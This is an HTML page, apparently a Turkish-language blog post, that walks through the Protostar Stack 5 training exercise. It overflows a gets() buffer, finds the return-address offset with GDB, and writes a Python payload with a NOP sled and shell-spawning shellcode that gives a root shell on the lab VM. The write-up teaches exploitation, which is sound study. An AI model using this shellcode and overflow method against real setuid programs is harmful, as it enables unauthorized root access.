@@ -1,0 +1,125 @@
+<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir şey yok"><title>Stack 5 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>Yazılar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>📖 4 dakika</span>
+<a href=..>↪ Protostar</a><h1 class=baslik>Stack 5</h1><main><h1 id=stack5-c>Stack5.c</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+{
+  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];
+
+  gets(buffer);
+}</code></pre></div><p><strong>Önceki seviyeden farkı burada zıplanabilecek herhanbgi bir fonksiyon yok!</strong></p><p><strong>Amaç:</strong> stack taşırılarak <code>eip</code> değerini stackten bir adresi gösterecek
+şekilde ayarlayıp shellcode çalıştırmak.</p><h1 id=programın-çalıştırılması>Programın Çalıştırılması</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:/opt/protostar/bin$ ./stack5
+
+user@protostar:/opt/protostar/bin$ python -c &#34;print &#39;A&#39;*100&#34; | ./stack5
+Segmentation fault</pre></div><h1 id=dönüş-adresini-tespit-etmek>Dönüş adresini tespit etmek</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ ./stack4
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
+Segmentation fault
+user@protostar:/opt/protostar/bin$ dmesg | tail -1
+[16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4</code></pre></div><p>Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault
+alıyoruz ve dmesg çıktısına baktığımızda <code>ip</code> registerinin <code>45454545</code> olduğunu
+görüyoruz.</p><p>GDB kullanarak aynı şekilde bu bilgiye ulaşılabilir.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ gdb stack5 -q
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483c4 &lt;main+0&gt;:    push   ebp
+0x080483c5 &lt;main+1&gt;:    mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:    sub    esp,0x50
+0x080483cd &lt;main+9&gt;:    lea    eax,[esp+0x10]
+0x080483d1 &lt;main+13&gt;:   mov    DWORD PTR [esp],eax
+0x080483d4 &lt;main+16&gt;:   call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:   leave
+0x080483da &lt;main+22&gt;:   ret
+End of assembler dump.
+(gdb) b *main+22
+Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
+(gdb) r
+Starting program: /opt/protostar/bin/stack5
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
+
+Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x4444444c
+) at stack5/stack5.c:11
+11      stack5/stack5.c: No such file or directory.
+        in stack5/stack5.c
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()</code></pre></div><p>Tabiki eip değiştirebilmek kod işletebilmek için yeterli değil. Stackte kod
+işletilebildiği durumlarda, eip&rsquo;ye stackten bir adresi göstermesini
+sağlayabilirsek istediğimiz shell kodunu çalıştırabiliriz.</p><h1 id=stack-adresini-bulmak>Stack adresini bulmak</h1><p>Yukarıdaki oturumdan devam ederek registerlerin durumuna bakarsak eğer esp bize
+stack pointerin en üst noktasının adresini verecektir.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>(gdb) i r
+eax            0xbffff730       -1073744080
+ecx            0xbffff730       -1073744080
+edx            0xb7fd9334       -1208118476
+ebx            0xb7fd7ff4       -1208123404
+esp            0xbffff780       0xbffff780
+ebp            0x44444444       0x44444444
+esi            0x0      0
+edi            0x0      0
+eip            0x45454545       0x45454545
+eflags         0x210246 [ PF ZF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51</pre></div><h1 id=peki-stackte-nereye-atlamalı>Peki stackte nereye atlamalı</h1><p>Stack&rsquo;e bakacak olursak input olarak verdiğimiz A karakterlerini görebiliyoruz.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>(gdb) x/64wx $esp-100
+0xbffff71c:     0x080483d9      0xbffff730      0xb7ec6165      0xbffff738
+0xbffff72c:     0xb7eada75      0x41414141      0x41414141      0x41414141
+0xbffff73c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff74c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff75c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff76c:     0x41414141      0x42424242      0x43434343      0x44444444
+0xbffff77c:     0x45454545      0x46464646      0xbffff800      0xbffff82c
+0xbffff78c:     0xb7fe1848      0xbffff7e0      0xffffffff      0xb7ffeff4
+0xbffff79c:     0x08048232      0x00000001      0xbffff7e0      0xb7ff0626
+0xbffff7ac:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
+0xbffff7bc:     0x00000000      0xbffff7f8      0x0b564e3d      0x2101382d
+0xbffff7cc:     0x00000000      0x00000000      0x00000000      0x00000001
+0xbffff7dc:     0x08048310      0x00000000      0xb7ff6210      0xb7eadb9b
+0xbffff7ec:     0xb7ffeff4      0x00000001      0x08048310      0x00000000
+0xbffff7fc:     0x08048331      0x080483c4      0x00000001      0xbffff824
+0xbffff80c:     0x080483f0      0x080483e0      0xb7ff1040      0xbffff81c</pre></div><p><code>\x45</code> leri değiştirerek eipyi kontrol edebiliyorduk. Stackte daha derinlere
+yazabiliyorsak o zaman shellcode&rsquo;u eip&rsquo;den bir sonraki adıma bırakır ve eip&rsquo;yi
+kendinden bir sonraki adresi gösterecek şekilde ayarlayabilirsek programın
+devamında istediğimiz kodu çalıştırabiliriz.</p><p>Kod üzerinde anlaması daha kolay olacağından ufaktan script yazalım.</p><h1 id=stack5-py>stack5.py</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x41</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>76</span>
+eip     <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb8\xf7\xff\xbf</span><span style=color:#e6db74>&#34;</span>
+nop     <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span>
+
+trap <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xCC</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>
+<span style=color:#66d9ef>print</span> padding <span style=color:#f92672>+</span> eip <span style=color:#f92672>+</span> nop<span style=color:#f92672>*</span><span style=color:#ae81ff>40</span> <span style=color:#f92672>+</span> trap</code></pre></div><p>Koddaki <code>\x90</code> lar NOPcode olarak bilinen işlemcinin o süreyi boş geçmesini
+sağlayan işlemci komutudur. Kısaca bu adreslerden birini çalıştırmayı
+başlatabilirsek ileride çarpacağı herhangi bir komutu çalıştırmaya devam
+edecektir.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5
+Trace/breakpoint trap</pre></div><p>Görüldüğü üzere <code>\xCC</code> bir işlemci tuzak kodudur. Debug işlemlerinde
+breakpoint&rsquo;ler bu şekilde sağlanır.</p><p>Yukarıdaki kodda eip adresi, <code>NOP</code> kodlarının olduğu herhangi bir yer olabilir.</p><h1 id=root>Root</h1><p>Koddaki trapleri kaldırıp shellcode yerleştirdiğimiz zaman teorik olarak root
+shellimiz bizi bekliyor olacak.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x41</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>76</span>
+eip     <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb8\xf7\xff\xbf</span><span style=color:#e6db74>&#34;</span>
+nop     <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span>
+
+shellcode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><span style=color:#e6db74>&#34;</span>
+
+<span style=color:#66d9ef>print</span> padding <span style=color:#f92672>+</span> eip <span style=color:#f92672>+</span> nop<span style=color:#f92672>*</span><span style=color:#ae81ff>40</span> <span style=color:#f92672>+</span> shellcode</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5
+user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5
+user@protostar:~$</code></pre></div><p>Burada Linux&rsquo;ta bulunan <code>|</code> işaretinden kaynaklı bir sorun var. Pipe soldaki
+programın çıktısını sağdaki programa input olarak veriyor böylelikle stack5
+programına istediğimiz inputu istediğimiz şekilde verebiliyoruz. Fakat soldaki
+program; ekrana bufferi doldurup, eip adresini güncelleyip, bir sürü nop
+ekledikten sonra shellcode yazıp kapanıyor. Böylelikle biz stack5&rsquo;te kod işletme
+hakkımız olmasına rağmen programdan çıkıyoruz.</p><p>Linuxta bulunan <code>cat</code> programı dosyaların içeriğini terminale basmakta
+kullanılabileceği gibi hiç bir argüman verilmemesi durumunda her satırı iki kere
+ekrana basar.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:~$ cat
+stack5  &lt;- input
+stack5  -&gt; output</pre></div><p>Python kodumuzu ve cat&rsquo;i birleştirerek root kabuğu elde edilebilir.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:~$ whoami
+user
+user@protostar:~$ whoami
+user
+user@protostar:~$ (python stack5.py;cat) | /opt/protostar/bin/stack5
+whoami
+root
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</pre></div></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>
